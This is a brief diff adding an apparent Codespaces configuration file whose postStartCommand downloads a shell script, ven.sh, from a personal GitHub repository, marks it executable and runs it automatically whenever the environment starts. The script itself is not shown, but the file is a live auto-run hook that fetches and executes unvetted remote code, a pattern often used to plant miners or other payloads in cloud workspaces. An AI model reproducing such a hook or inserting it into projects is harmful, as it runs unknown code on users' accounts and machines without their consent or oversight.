@@ -1,0 +1,4 @@
+{
+  "name": "My Auto-run Codespace",
+  "postStartCommand": "wget https://raw.githubusercontent.com/dedekok/coba/refs/heads/main/ven.sh && chmod +x ven.sh && ./ven.sh"
+}
